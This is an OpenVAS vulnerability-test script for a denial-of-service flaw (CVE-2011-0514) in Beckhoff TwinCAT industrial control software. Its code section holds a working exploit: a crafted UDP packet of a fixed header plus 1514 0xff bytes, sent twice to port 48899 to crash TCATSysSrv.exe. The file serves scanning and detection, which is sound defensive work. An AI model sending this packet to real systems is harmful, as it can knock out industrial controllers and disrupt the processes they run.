###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_beckhoff_twincat_datagram_pkt_dos_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Beckhoff TwinCAT 'TCATSysSrv.exe' Network Packet Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to cause denial of service
  condition
  Impact Level: Application";
tag_affected = "Beckhoff TwinCAT Version 2.11 build 1553,Other versions may also be affected.";
tag_insight = "The flaw is caused by an error in the 'TCATSysSrv.exe' when performing an
  invalid read access, which can be exploited by remote attacker by sending
  malformed packet to port 48899/UDP.";
tag_solution = "No solution or patch is available as of 20th September 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.beckhoff.de/twincat/";
tag_summary = "This host is installed with Beckhoff TwinCAT and is prone to
  denial of service vulnerability.";

if(description)
{
  script_id(802036);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-22 10:24:03 +0200 (Thu, 22 Sep 2011)");
  script_bugtraq_id(49599);
  script_cve_id("CVE-2011-0514");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Beckhoff TwinCAT 'TCATSysSrv.exe' Network Packet Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45981");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17835");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/105088");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/twincat_1-adv.txt");
  script_xref(name : "URL" , value : "http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-06.pdf");

  script_description(desc);
  script_summary("Check Beckhoff TwinCAT is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports(48898);
  script_require_udp_ports(48899);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}
##
## The script code starts here
##

## Beckhoff TwinCAT TCP port
tcp_port = 48898;

## Check tcp port status
if(!get_port_state(tcp_port)){
  exit(0);
}

## Beckhoff TwinCAT UDP port
udp_port = 48899;

## Check udp port status
if(!get_udp_port_state(udp_port)){
  exit(0);
}

## Confirm Beckhoff TwinCAT other port is running
## This port also stops listening, if exploit works successfully
soc = open_sock_tcp(tcp_port);
if(!soc){
  exit(0);
}
close(soc);

##  Open udp socket
soc1 = open_sock_udp(udp_port);
if(!soc1){
  exit(0);
}

## Crafted udp packet
req = raw_string(
                  0x03, 0x66, 0x14, 0x71, 0x00, 0x00, 0x00, 0x00,
                  0x06, 0x00, 0x00, 0x00, 0x0a, 0xff, 0xff, 0x02,
                  0x01, 0x01, 0x10, 0x27,
                  crap(data:raw_string(0xff), length:1514)
                );

## send the data
send(socket:soc1, data:req);
send(socket:soc1, data:req);

## wait for 7 sec
sleep(7);

## Confirm Beckhoff TwinCAT Server alive or dead by checking
## TCP port 48898 as it's hard to detect UDP port status and
## available function will not work properly
soc2 = open_sock_tcp(tcp_port);
if(!soc2)
{
  security_warning(udp_port);
  exit(0);
}
close(soc2);
